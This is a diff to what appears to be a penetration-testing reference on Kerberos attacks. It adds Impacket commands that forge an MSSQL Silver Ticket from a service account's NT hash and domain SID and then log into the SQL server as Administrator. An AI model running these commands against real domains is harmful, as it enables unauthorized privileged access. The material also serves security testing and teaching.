@@ -690,6 +690,18 @@ ticketer.py \
 
 export KRB5CCNAME=Administrator.ccache
 smbclient.py -k -no-pass $DOMAIN/Administrator@$TARGET.$DOMAIN
+
+# MSSQL Silver Ticket
+ticketer.py \
+  -nthash $SERVICE_HASH \
+  -domain-sid $DOMAIN_SID \
+  -domain $DOMAIN \
+  -spn MSSQLSvc/$TARGET.$DOMAIN \
+  -dc-ip $DC_IP \
+  Administrator
+
+export KRB5CCNAME=Administrator.ccache
+mssqlclient.py -k -no-pass $DOMAIN/Administrator@$TARGET.$DOMAIN
 ```
 
 ### PAC Validation — Why Silver Tickets Sometimes Fail
